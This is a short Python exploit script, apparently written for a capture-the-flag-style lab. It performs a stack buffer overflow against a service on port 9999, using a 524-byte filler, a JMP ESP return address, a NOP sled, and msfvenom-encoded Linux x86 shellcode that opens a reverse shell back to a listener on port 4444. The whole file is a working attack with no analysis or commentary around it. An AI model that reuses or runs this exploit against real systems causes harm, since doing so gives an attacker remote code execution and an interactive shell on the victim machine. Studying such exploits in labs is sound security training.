#!/usr/bin/python3

import sys, socket
from time import sleep

#badchars = /x00

#msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.9.185.104 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -a x86 -b "\x00"

payload = ("\xda\xd2\xbf\x59\x63\xc8\x55\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x12\x83\xea\xfc\x31\x7a\x13\x03\x23\x70\x2a\xa0\xe2\xad\x5d"
"\xa8\x57\x11\xf1\x45\x55\x1c\x14\x29\x3f\xd3\x57\xd9\xe6\x5b"
"\x68\x13\x98\xd5\xee\x52\xf0\xef\x19\x1c\x68\x98\x1b\x5e\x79"
"\x04\x95\xbf\xc9\xd2\xf5\x6e\x7a\xa8\xf5\x19\x9d\x03\x79\x4b"
"\x35\xf2\x55\x1f\xad\x62\x85\xf0\x4f\x1a\x50\xed\xdd\x8f\xeb"
"\x13\x51\x24\x21\x53")

filler = "A" * 524
EIP = "\xf3\x12\x17\x31" #JMP ESP - 311712f3
offset = "C" * 4
nops = "\x90" * 32
buffer = filler + EIP + offset + nops + payload

try:
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.connect(("10.10.215.180",9999))
    s.recv(1024)
    s.send(buffer + "\r\n")
    s.close()

except:
   print("Application crashed")
   sys.exit()
